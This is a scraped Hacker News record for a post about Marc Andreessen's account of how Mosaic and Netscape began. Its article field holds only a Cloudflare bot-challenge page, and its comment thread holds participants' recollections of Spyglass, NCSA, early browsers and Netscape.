[
  {
    "id": 40825033,
    "title": "The story, as best I can remember, of the origin of Mosaic and Netscape [video]",
    "originLink": "https://pmarca.substack.com/p/the-true-story-as-best-i-can-remember",
    "originBody": "Just a moment...*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131}button,html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}@media (prefers-color-scheme:dark){body{background-color:#222;color:#d9d9d9}body a{color:#fff}body a:hover{color:#ee730a;text-decoration:underline}body .lds-ring div{border-color:#999 transparent transparent}body .font-red{color:#b20f03}body .pow-button{background-color:#4693ff;color:#1d1d1d}body #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}}body{display:flex;flex-direction:column;min-height:100vh}body.no-js .loading-spinner{visibility:hidden}body.no-js .challenge-running{display:none}body.dark{background-color:#222;color:#d9d9d9}body.dark a{color:#fff}body.dark a:hover{color:#ee730a;text-decoration:underline}body.dark .lds-ring div{border-color:#999 transparent transparent}body.dark .font-red{color:#b20f03}body.dark .pow-button{background-color:#4693ff;color:#1d1d1d}body.dark #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjZDlkOWQ5IiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body.dark #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI0IyMEYwMyIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjQjIwRjAzIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}body.light{background-color:transparent;color:#313131}body.light a{color:#0051c3}body.light a:hover{color:#ee730a;text-decoration:underline}body.light .lds-ring div{border-color:#595959 transparent transparent}body.light .font-red{color:#fc574a}body.light .pow-button{background-color:#003681;border-color:#003681;color:#fff}body.light #challenge-success-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI2IDI2Ij48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJNMTMgMGExMyAxMyAwIDEgMCAwIDI2IDEzIDEzIDAgMCAwIDAtMjZtMCAyNGExMSAxMSAwIDEgMSAwLTIyIDExIDExIDAgMCAxIDAgMjIiLz48cGF0aCBmaWxsPSIjMzEzMTMxIiBkPSJtMTAuOTU1IDE2LjA1NS0zLjk1LTQuMTI1LTEuNDQ1IDEuMzg1IDUuMzcgNS42MSA5LjQ5NS05LjYtMS40Mi0xLjQwNXoiLz48L3N2Zz4=)}body.light #challenge-error-text{background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMiIgaGVpZ2h0PSIzMiIgZmlsbD0ibm9uZSI+PHBhdGggZmlsbD0iI2ZjNTc0YSIgZD0iTTE2IDNhMTMgMTMgMCAxIDAgMTMgMTNBMTMuMDE1IDEzLjAxNSAwIDAgMCAxNiAzbTAgMjRhMTEgMTEgMCAxIDEgMTEtMTEgMTEuMDEgMTEuMDEgMCAwIDEtMTEgMTEiLz48cGF0aCBmaWxsPSIjZmM1NzRhIiBkPSJNMTcuMDM4IDE4LjYxNUgxNC44N0wxNC41NjMgOS41aDIuNzgzem0tMS4wODQgMS40MjdxLjY2IDAgMS4wNTcuMzg4LjQwNy4zODkuNDA3Ljk5NCAwIC41OTYtLjQwNy45ODQtLjM5Ny4zOS0xLjA1Ny4zODktLjY1IDAtMS4wNTYtLjM4OS0uMzk4LS4zODktLjM5OC0uOTg0IDAtLjU5Ny4zOTgtLjk4NS40MDYtLjM5NyAxLjA1Ni0uMzk3Ii8+PC9zdmc+)}a{background-color:transparent;color:#0051c3;text-decoration:none;transition:color .15s ease}a:hover{color:#ee730a;text-decoration:underline}.main-content{margin:8rem auto;max-width:60rem;width:100%}.heading-favicon{height:2rem;margin-right:.5rem;width:2rem}@media (width Enable JavaScript and cookies to continue(function(){window._cf_chl_opt={cvId: '3',cZone: \"pmarca.substack.com\",cType: 'non-interactive',cNounce: '8099',cRay: '89b82b2d1a2d2b5a',cHash: 'bd7c1bc84b2d65c',cUPMDTk: \"\\/p\\/the-true-story-as-best-i-can-remember?__cf_chl_tk=asOFPvQq.QzZdGVGN424yleoEou0aBWCIbg1i5BgfwM-1719687723-0.0.1.1-3753\",cFPWv: 'g',cTTimeMs: '1000',cMTimeMs: '120000',cTplV: 5,cTplB: 'cf',cK: \"visitor-time\",fa: \"\\/p\\/the-true-story-as-best-i-can-remember?__cf_chl_f_tk=asOFPvQq.QzZdGVGN424yleoEou0aBWCIbg1i5BgfwM-1719687723-0.0.1.1-3753\",md: \"qTmNzcj7QQ6nuRjJqq9QJ0_NxoTLTG3lCKJv62oPz7k-1719687723-1.1.1.1-qHjgGV0.N5P6vjv9LThnsOrApWJKIK5m6frvAUmgVmtlapZwjakUk2RPdE7s1vkymWbI.MMUnCMzbIVi78zP3WrYLNDeQpjyZrRbiwWC_bll2JiZXI2JYjiSNbHntNgME9PK_cXbR9r5uzBcO5wwaFJzvAIn2ri6tJEcKsvOsNVtKR5b5NX2L1lkRytnab7pLkjrc1bEV.vK.B7tZraOZdZgIKoHte3mhKKLb_oFJTDRr9tsYmdqCVDamG2obMv.nfJo.Vs3sLgJKvp2SsE3qsohf2MvwIKt3K5QAWZWFNvHArZOkC4htiBXDeMUMzZNgX3vJ5WIpIRWcJJqYUTpx_IKpEdNX75s9ZKxmbEOULMCn.gWvtmnc.XZvo..WEn0IMHhx9Q2Fg4YLS..Jy8JgNBeyL0DPl0v2Wy0mIggMC6ZtKuZ7dxUdXMfPAA342TMGnD2HQ2pEc.tW5qzuO7K.G.PGWKIRABHpZk0N2z.BBb6Hhd1gAM05twJRkyIAIdj1jroOWNR1PwB3mZaXJIVBqTsV.GWJMdWW8V4vK0LME5OwqoLXFPUcbnsO7jzUw3s50zE1OocMz9yZTT4WpGGCODkD1YK01gerQeoiynKeeMQw62_E4N2BNxZtqvxqHlBIrcswqmbNejqne4zZ.qaeWNU0JBe0j7Qwrad4jhkhkWS3eMqwHveMUDsvKOYWlEivGLqCmvywAbpZdu.J8iUeDlgShBe4CbAY9I68VoZbWYkNW1IzoQ5zW7P7cDlayK0khp5BuCudkq25CLHslfk1HfJ2OXRB3_F_wdidY47j6kXA_lxq5VPa8Y9_CIWWsNJEEBdzCk0NM7WieKRzdAgeywl2bHJTGyG6Rs7V_44MrVFsHMYJ3nImFGKE.qGb1H_SB03ZmsghFNGD62puPclVd9NsqROQ9zq.tu5SU40QP3nVP4LOswti8YUCkOd45sxhJpnYbgBbNmXmJji5AKpJAtxHtILwEqF1uL5WB5vXwtiK9utc719mbmNacTJbVJA0PtuKYpAE7AJiAPCTdl49jbNmeOqWcn8GH5bAzrlNFlHtpa1zub0K8YonXufzy4Q7kgJ0zXWpFWylHJFR70.LeXr35jQXUVy3qOYmQWqp8gb5mpo3__J8aixCJyidtqSonW4et0TwCtMB_5U_aMhgrICaIO9eQO_BxZeuLJvNJed9A1yi18WzCaIvDGM.cJkkIueipfk_.OISTDalCod3c.zQw6z122nonxWqYvPb.9Y9v0e.u3t24oubWDoPVE2UN1N_TzC4T6bAE1lfk7XwvuHkvxiX_fTbhdktpafczU\",mdrd: \"YuQCIXIWaPEeh_GAA4BjUfzMooba37CVNeHp6aUSju0-1719687723-1.1.1.1-tNdHbhNUjtD.xL_M1MWkuLwKc9lmyH48A3h69z7EFvgrFF1azbBU04rFyEKaSBJe3QQmJuFR5sLy2OCfCHSOuWnudnGdxQN5BmeOKXRW7qoyC.Hjw2zA_wTTlmqQ.lrmbNjtgxhFHNAP0mcJzaq32HX3reysXI5juryFSVvoyU7fm7XvQb.zvMns1yCm_ewmMcMv67goJPPRL5LYrQogXq0NJBYVDrfP5rvWwD8bl0bf7ucvDAztpTcAQaVxo03PE.hi74JhsBCtZEb7vYd6.S3nLBSSLfafYq7HhyBeGp3LHuACCHOrEh3CRwuazPqBr9owHw4Y6jlvgiptH21Q40GxuYxGpOZRWbu2jTmHNufI6.ElGbGIcZj3geqOBqTk8.a..A6HbhdIDfVkT7SorHnuGZ.v3HZEFXGWpbKJLtLmegODlaOezxj2c5imMkG2jueerabvWxckwLtw2XF1pKRLNjjBy5uPR.7xtLHaW8ifRX05iRN7fp2yWgWC2YitA5tZPhnl4XMaEYdmPvdDjb7g9q3UochjL9xhhNbK1Kae2CEoUVrrYZaxYnXm3kuxC5ll5mJRA.kRVULUvwZ0.hM4Zz.aH4ykEVaYkz0zzhtFYMSrpZ.tQy.lM9O3os82UNsSJ9uOq2rGZetpDnTavw24MGQlCbVg5klyKCS1SGlMZKzHMfJRmDsRNiaX0849vIlmV6CQQUWCs5AIOTbquBSbQhYHORORQeTLNBMvX8hh..88ghmO7tcVfu6PJt9ZXcLhMl2mea17LlviVq9UA4NAhE27QukuAD9TJHa9wgqnMDVOlQQdo2nlYFvddBtTL19iML0C.Sz9rt5L.jg8MPYD.eRadTXEVWbmjx_0Oxq1relnMmU2qEdl6GJ__OkZ9neJSuhvoizQsT2RA2RYg.7gJnYTO6yM4xMbqH9DWbSeieIp9AYTpv2j6Xjh3hl8QAu.jyv30pwXyv2WwzFqaLElUy4vTWzMa8a43lZ9zv9iLpxN.hp0mSpTbJywlshf7ZOZTr_bkFiiYtB0BbjN.M.T1Z45SspWb_RoBieKd0Qjr5dWeA7GlTzRBDbUV8Pdm19XyR4gE8g6CiscKksCe6hjhZ4TZVKvgVd.3wwff3Q94Lbs3QviQhfIUvZn8TfhKwM5aPkUF8lSBU4_it9L9__gd3WFjojL7Sb7hlFFSP26BYMTBl8OLW8L0rqc5uQPS2OoPaleMxCCSaQUzUA3oEx8sxVmVPTou85iAdn.E8i9wug9B_1ig6iooxFuhsF1kLsI0IuO2W2UXWANvuAckCHEnV2zD_MohZMnrjCTQIEE9ofTbtZin.M4Fox18euvRV7iivtYFzlFPy4uDeL7YS7V_.gjXwwoDwVuTwBT3LcDNWW9hjNbC_aeBTEciasY6Ypsp6TGMNiJPwwEKWyTzKnj3bMo8z1y78a7IBQAWaTv23fhbH4Kb53Jku0zAxfhdfRN6yej4IJgyJrZKfgK6BxDYuLAdf13OrqFV5XTXxkCBqnEE.dyvC6rsn0ZXXVtXsCiPD7lRJaa1TxhGQUa8exmsla1WYOKLu8h9DtNuTcJ_DHwIWa1m2.XtXpy6IHdrx5ZITDXSEKFe6Pty.vRD9JWNU3PgsujPOc5xYNCVdW4he2_EPWgFXojy4qyyHZc_emUicyasx6u2PJK0clvaMOsjOUeGcz_zQBwrU9VjP2eZ66K1PplHHW6WSFaIj8aJFTUwW2QmkMulKPa5RpEoWL74gJlf_UXC_Cmf.FHQIQwW7pCwHSMW3kyIwTRBEYkggzAaXfnFUKH7vlEBHD6xTYwRHYi6QguRspy.cgiqE1WqHntasG4M4mxE.Izma6B35OquBNrnyZFIzOx0TRouC90.VwUhrrwssV5rFclUKhD70mM3pPpVp_kGiWaJ5dLWcZMTykeNtIv13nWrNuAu_hcswcUXAIjpdGg8yoAEMbhqVJQbaxji39ZUNlmvisTJnZ4gXg9fLx20r9aHL6Fcan5D5C1ORwHiR8_0.OG03VKgeIduSJMIoy9MCwRde35ZvLK7s4ExtHYz0y73Qhs2C9EPTWqOOTZA9SulPKVpwaf0mS5LQFUepfyZKcsZe6PTWxl35N3f6XFMUyotHfbXhmWM2cPLvndVuzb_ZAilhw5HlBW.LMc1Q2GZ2EzktpwsW9qSpqo7.RZP35tkYPYSaVFU92Xbs6JCaTmIwcnGAJ9Zg0xpKG3JAb0A5aevgmzt1kD_loKlNqBU.axh0O3xG4S3Uwm6tAA2bz7054jE_fpKt8Pzm0b.TB5uadZJRI8\",cRq: {ru: 'aHR0cHM6Ly9wbWFyY2Euc3Vic3RhY2suY29tL3AvdGhlLXRydWUtc3RvcnktYXMtYmVzdC1pLWNhbi1yZW1lbWJlcg==',ra: 'TW96aWxsYS81LjAgKGNvbXBhdGlibGU7IEdvb2dsZWJvdC8yLjE7ICtodHRwOi8vd3d3Lmdvb2dsZS5jb20vYm90Lmh0bWwp',rm: 'R0VU',d: 'sITGMW2OYEqV7JogAFevuhLx5j005Zwo/7nLCnT9uGY4JHD008/VYLy5P9kgPvjLlA10THsi4z+VUModpc+0koSeZMqU1QZULghPk0E94wNx8UgcxBD9e5ZmZ5Wxdx4S3r8VTkzSH5u7oDYyJWkWNdayYdN147Es31PDUdwK3nj5FGUWEgq0nKH3INjT9Wgg7hKnwUhC50x212fM5u7/dZtHoTLW/b6+IVakraCv5K9AKzQL8L3t9tCn2K74XNvcqIGgnEDS5CHbOWAENeda36E039sEZjjjegj4HJfuALJZZwptVZWUzB+qpUaCzR1WG4QZaV5I8fSGIl9S8Yc0d8YZ60+avwzCW7s0XJxdBwV6htoqv0bOYjv4FYWTffCJaCXL5N8tnPEdSIz+MhYiQwk4ztnrB3f3YHJ3gvYm4wkJK4cepItm7+BzXMUbP5Vjom9scdFf2HqkmszNAXYxJbGYJ5KndsJuS0TIVhTdnIkFvLVJdvkxP3Yt21zO5d/M3aKlZEPaQs/4LI2u/pPOk41GQERpM2yd4WsFLcufSPisa0O2Hy30FyfzAbelxj88',t: 'MTcxOTY4NzcyMy4wMDAwMDA=',cT: Math.floor(Date.now() / 1000),m: 'oBMHqHHtRSeCvTePZUfmGIlZAISNImUl3zBsJurobRs=',i1: 'sNvSX2M6nhQNko/2b1QXzA==',i2: 'sanzfo63ZKXMSmchupt/+Q==',zh: 'o01jypKJQ++/gkxUTvC40nYpXBhuMc66cm0hd/Tc920=',uh: 'idqvltDEaw6z1eUpAaUFY/6rIUCphTJo6GMHGHVnQbg=',hh: 'Nxm+Kk2J0/8vlkwUJnKX4aXFgqILVqwS8PgqctCgktk=',}};var cpo = document.createElement('script');cpo.src = '/cdn-cgi/challenge-platform/h/g/orchestrate/chl_page/v1?ray=89b82b2d1a2d2b5a';window._cf_chl_opt.cOgUHash = location.hash === '' && location.href.indexOf('#') !== -1 ? '#' : location.hash;window._cf_chl_opt.cOgUQuery = location.search === '' && location.href.slice(0, location.href.length - window._cf_chl_opt.cOgUHash.length).indexOf('?') !== -1 ? '?' : location.search;if (window.history && window.history.replaceState) {var ogU = location.pathname + window._cf_chl_opt.cOgUQuery + window._cf_chl_opt.cOgUHash;history.replaceState(null, null, \"\\/p\\/the-true-story-as-best-i-can-remember?__cf_chl_rt_tk=asOFPvQq.QzZdGVGN424yleoEou0aBWCIbg1i5BgfwM-1719687723-0.0.1.1-3753\" + window._cf_chl_opt.cOgUHash);cpo.onload = function() {history.replaceState(null, null, ogU);}}document.getElementsByTagName('head')[0].appendChild(cpo);}());",
    "commentLink": "https://news.ycombinator.com/item?id=40825033",
    "commentBody": "The story, as best I can remember, of the origin of Mosaic and Netscape [video] (pmarca.substack.com)310 points by kjhughes 22 hours agohidepastfavorite112 comments gabrielsroka 20 hours agoThe video player didn't work too well. Here's the YouTube version https://youtu.be/8aTjA_bGZO4 ericsink 20 hours agoprevBased on my understanding, some of the details he gave about the Spyglass/Microsoft situation are not quite right, but I don't think it would appropriate for me to provide specific corrections. However, since I was the Project Lead for the Spyglass browser team, there is one correction I can offer: We licensed the Mosaic code, but we never used any of it. Spyglass Mosaic was written from scratch. In big picture terms, Marc's recollections look essentially correct, and he even shared a couple of credible-looking tidbits that I didn't know. It was a crazy time. Netscape beat us, but I remember my boss observing that we beat everyone who didn't outspend us by a favor of five. I didn't get mega-rich or mega-famous like Marc (deservedly) did, but I learned a lot, and I remain thankful to have been involved in the story. reply jesup 4 hours agoparentIn ~1997ish, the company I was soon to work for licensed Spyglass for use in our Internet-over-cable-TV startup, WorldGate. We ran the browsers in the headend, eventually on custom-designed laptop-chipset-based blades, 10 to a 2U chassis, with 10-20 browser instances running on each blade. (No commercial blades existed back then.) We compressed the screen images and sent them down to settops, with user input via IR keyboards and remotes being sent back up to the headend. I was hired in Sept 1998 to work on the browser; we had built our own Javascript engine to add to it (since that was kinda required for the web by then). I rewrote all the table code, because it just really didn't work well when you had \"too few\" horizontal pixels, especially if table widths were expressed in things like %. In the end, after a major redesign of all the table code, it did better than Netscape did in the 'hard' cases. However, before long, it became apparent with all the additions being made as part of HTML4 that sticking with Spyglass-derived code and trying to update it ourselves to compatibly implement HTML4 (or enough of it) was going to be a herculean effort for a small company (max ~350 people and briefly a $1B valuation (1999), but only around 5 or 10 people max on the browser, including the JS engine. Given that, I made the decision in late 1999/early 2000 to switch us to the upcoming Mozilla open-source browser, and got deeply involved. The Internet-over-cable-TV part of the company failed (cable companies had other priorities, like breaking TVGuide's patent monopoly, which they paid us to do for them), and we moved onto other markets (hardware videophones) not involving browsers in 2003. I stayed involved peripherally in Mozilla, and when WorldGate dissolved in 2011 I joined Mozilla fulltime to lead the WebRTC effort. The Spyglass internal architecture seemed at the time to be pretty reasonable compared to what I knew of the NCSA code. reply ericsink 3 hours agorootparentInteresting. I left Spyglass in January 1997, just as they were heading in that general direction. reply fnordpiglet 19 hours agoparentprevI was on the early Netscape team and you guys were always cooler than us by a mile IMO. Markets aren’t always about best. reply HaZeust 19 hours agoparentprevEric, I remember reading your Browser Wars web blog about a decade ago, and this posting caused me to jump back to the source material. While Marc recounts that Microsoft offered for Spyglass to sell \"Microsoft Mosaic\" as an add-on while still offering your own independent version - despite MSFT eventually making its own browser free anyway - is there anything within that part of the larger story that you would elucidate to tell differently, or clarify deeper into its weeds? It was always one of the parts of the story that was more glossed over. reply hinkley 19 hours agorootparentI started at NCSA about eight months after Marc left. What I recall of this time is that the management at NCSA found the Microsoft folks so abrasive that they got fed up and told them to talk to Spyglass. I can’t recall the exact timing of when NCSA ceded all sublicensing rights to Spyglass. It may have been after that experience or a relief that they could send MS away in good conscience. reply ericsink 18 hours agorootparentprevI don't remember anything about \"Microsoft Mosaic\" as a name, but we definitely retained the right for Spyglass to sell our own browsers. In my recollection, the initial payment from Microsoft to Spyglass was higher than what Marc said, but I'm not sure. But I am sure that the deal was later renegotiated at a substantially higher number. I'm also pretty sure that even after that rework of the terms, Spyglass didn't get enough from Microsoft to compensate for the fact that Microsoft, er, you know, killed the browser business. And insofar as that is the essence of Marc's point, I agree with it. reply HaZeust 18 hours agorootparentSorry, I should have cited. 1:52:30 \"The Microsoft guys call Spyglass and they're like, yeah, we want to license Spyglass Mosaic so we can build it into Windows. The Spyglass guys say, yeah, that sounds great. Basically, how much per copy are you going to pay us for that? Microsoft says, you don't understand, we're going to pay you a flat fee, which is the same thing that Microsoft did when they originally licensed DOS way back when. But Microsoft said, basically, or at least my understanding of what Microsoft said was, don't worry about it. We're going to sell it as an add-on to Windows. We'll have Microsoft Mosaic and then you'll still have Spyglass Mosaic and you can sell it on other operating systems or compete with us or whatever, do whatever you want.\" Thank you for your response! reply PeterStuer 7 minutes agoprevI remember the looks of despair from network managements as I told them about Mosaic. \"Downloading 100s of KB just to look at stuff once!?*&!\". Admittedly, the whole of our university was behind a 2 Mbit link, which was probably the most Internet bandwith in the whole of Belgium at the time. reply detourdog 20 hours agoprevI remember being underwhelmed by the www before the graphical browser. Gopher I felt was superior. I would read about the graphical web browser in magazines but it required a slip Connection which may not have existed at this point. One day I read about a guy in brooklyn who had a website at www.soundtube.com and was selling music on the internet . I got in touch and went to his office in brooklyn to look at his website in a graphical browser. I than followed his lead in getting setup. The logo for the site was a half squeezed tube of toothpaste with the word sound tube on it. I don’t remember his delivery mechanism. The last time I visited the site it was the same logo but with the subtext that “what could have been”. I occasionally look for more information about sound tube. Seems to be lost but I hope it is only missing. reply dang 17 hours agoparentPretty sure that was my friend Joe. A passionate music fan and early tech adopter who ran one of the first online record stores out of his apartment in Brooklyn. I visited that apartment too! Inviting you over to show you a graphical web browser is exactly the sort of thing he would do. It was called Sound Wire, not Sound Tube - which is probably why you couldn't find anything... perhaps the name got mixed up with the toothpaste logo in your memory. Memory does that! https://web.archive.org/web/19961122055147/http://soundwire.... https://www.wired.com/1995/05/net-surf-44/ p.s. I messaged him - maybe he'll show up in the thread reply fsckboy 15 hours agorootparentanimated toothpasted logo http://web.archive.org/web/19980116081704/http://soundwire.c... reply detourdog 10 hours agorootparentprevAwesome, missing not lost yes it was soundwure. Joe must have been the one that told how to register a domain name. reply Scoundreller 19 hours agoparentprevEvery once in a while I fire up Lynx for various reasons. I’ll try to go to news.ycombinator.com and Lynx tries to make an NNTP connection and I don’t blame it. reply fellowniusmonk 18 hours agoparentprevOh wow, I had completely forgotten about slip connections, what a nightmare to try and figure out during the time period. Loved gopher, used it all the time. reply bane 15 hours agorootparentRemembering other pseudo packet data connections that could interleave various data streams all at once, I wanted SLIP so bad, but could never figure it out. The paradox of the early internet is that we didn't have the internet at that time to help us out. reply latchkey 15 hours agoparentprevgopher client ux was really nice, but building the \"gopherapps\" was not fun at all. reply jbaber 18 hours agoparentprevSomeone else told me they thought lynx came first. Is that really true? I thought images were there from the beginning. reply fsckboy 14 hours agorootparentlynx's goal was running in-terminal/cli, not \"full web, because web has no images\". HTML was also designed to allow unknown tags to be ignored. back in those days I ran mosaic and netscape with image download off by default to speed navigation up. reply robterrell 18 hours agorootparentprevLynx wasn't first: https://en.wikipedia.org/wiki/WorldWideWeb reply asveikau 15 hours agorootparentNot first but the initial release was 2 years before Netscape was founded, and 1 year before Mosaic. It was definitely an early browser. I first used lynx years later when I was getting into Linux in the late 90s, and I found that part surprising at the time. reply 1vuio0pswjnm7 14 hours agorootparentprevThe second web browser came in 1992. Unlike the first one from 1990 that was written in \"Objective C\" for _only_ NeXT computers (thanks to Steve Jobs BS), this one was written in C and thus portable to multiple operating systems and multiple architectures. It was distributed with a library, libwww, and at least thirty(!) simple, example programs illustrating how to use the library to write programs to access websites. IMHO, it puts to shame the bloated, non-portable, overly-complicated, advertising-sponsored crap that is distrubuted today. https://www.w3.org/Library/Distribution/w3c-libwww-5.4.2.tgz 30 small example programs written in C plus documentation for every one. Good luck finding something like that today. reply dboreham 16 hours agorootparentprevLynx wasn't first, but images weren't there from the beginning either. At least, not inline images. reply bengoodger 20 hours agoprevI'm about a half hour into this, and listening to Marc talk about newsgroups brings strong pangs of nostalgia. These days I'm a bit of a greybeard (salt-n-pepper beard?) of web browsing, but I remember getting started in the late days of Netscape, as a teenage open source hacker discovering all the Netscape engineers sitting on the npm.* newsgroups.. how wild it was to be able to turn up there with a question about the browser you used every day and have someone working on it answer! Netscape didn't survive, but what a legacy. reply esprehn 16 hours agoparentThat world lived on for quite a while through different mediums. I remember joining the webkit IRC channel in the early days and being full of wonder that folks like Hyatt were just hanging out willing to chat with me and answer questions. There's something really special about the community and openness of folks who work on web browsers. Maybe it traces it's way back to the newsgroups. reply tingletech 19 hours agoparentprevWhat were the npm.* newsgroups? I don't remember that hierarchy. Where Netscape and Node contemporaneous? reply bengoodger 19 hours agorootparentnetscape.public.mozilla.* The hierarchy there was basically a reflection of the company's browser team org chart. You could find a group for every team working on the browser where many of them were having their regular technical conversations. reply codetrotter 18 hours agorootparentJust now I am realizing that Slack is a lot more like a Usenet client than it is like an IRC client. I mean. It’s still very far from actually being NNTP, and it’s not decentralized like Usenet or anything like that. But all this time I’ve been thinking of Slack as “better IRC, with images and links and threads”. When really Slack is more like “fancy Usenet service with client that renders images and other attachments”. (Although on the protocol and server and client implementation level it is very different from NNTP.) Well. At least we don’t have to inefficiently yEnc encode attachments nor to split attachments into a bunch of pieces with par2 files. So there’s that. reply nsguy 19 hours agorootparentprevnode.js and Netscape are about 20 years apart ;) I also don't remember an npm. newsgroup hierarchy. As a teenager during that time I recall some binary newsgroups though :) reply dboreham 14 hours agorootparentThere were netscape.xxx internal news groups. reply webwielder2 20 hours agoprevI recently read Michael Lewis's \"The New New Thing,\" which posits that Netscape was a get-rich-quick scheme by Jim Clark to fund a computer-navigated sailboat. He knew that Microsoft would render the company obsolete in six months, and bet that investors wouldn't glom on to that fact quickly enough. And boy was he right! reply hinkley 19 hours agoparentThat would be consistent with the stories I heard about what hot garbage their Server Software was. The fact that it was where most of their money came from was problematic. It was not built to be a cash cow. I I do think that the free Netscape browser was the genesis of the free-app-with-strings-attached quagmire we are stuck in, but I can’t blame NS for that because one of the browsers Netscape was competing with, the one Spyglass employees seem to leave out of the Browser Wars rather conspicuously, was NCSA Mosaic. Which was developed under grants from the National Science Foundation and thus given away for the public good. It’s hard to compete with free. And the NSF asked several times if they should still be funding it. reply specialist 17 hours agorootparent> hot garbage their Server Software was True. I created an online product catalog thing. For reasons I can't remember, I used SuiteSpot and JRunner. Turrible. Absolutely turrible. Truly unforgivably bad. Ditto their LDAP thing. And Netscape sabotaged Java and Applets. And created JavaScript. And XUL. And... But hey, marca famously named the image tag \"img\". So it wasn't all bad. reply quonn 41 minutes agorootparent> And Netscape sabotaged Java and Applets. And created JavaScript. And XUL. So in that alternative universe we would likely have a non-responsive rectangle kind of UI that has to be loaded upfront. Despite all its shortcomings I much prefer the web, thank you very much. reply dmckeon 16 hours agorootparentprevand Mork. Not the alien, but https://en.wikipedia.org/wiki/Mork_(file_format) reply jeremie 2 hours agoprevGreat memories! Back in ‘98 I found a floppy with my original 1994 Netscape Mosaic v 0.93 Beta and shared a bunch of tidbits about it on my personal site (thank you Internet Archive!): https://web.archive.org/web/20010430044121/http://www.jeremi... Posted it to slashdot at the time too, I miss those green colors ;) https://slashdot.org/story/98/10/28/1923205/original-netscap... reply mturk 20 hours agoprevI've worked at NCSA (to one extent or another) for about a decade. It's pretty remarkable to hear (from people who both pre-dated and post-dated the browser work) about the suite of tools being developed around that time. Many had a deep focus on collaboration, but none took off quite as much as Mosaic. A few are harder to find out about -- like the XCMD extension to HyperCard that added support for animations right off the Cray, or Contours, or PalEdit, or Montage for collaborative environments -- and others, like Habanero a few years later ( https://www.hpcwire.com/1999/04/16/ncsa-habanero-hot-java-ba... ) left comparatively bigger footprints. reply devilbunny 19 hours agoparentNCSA tools were a huge thing for those of us who used DOS. In the summer of 1995, I was still using Windows 3.1, and I was the only one who brought a computer to the research program I was enrolled in (not CS). When I told people that they 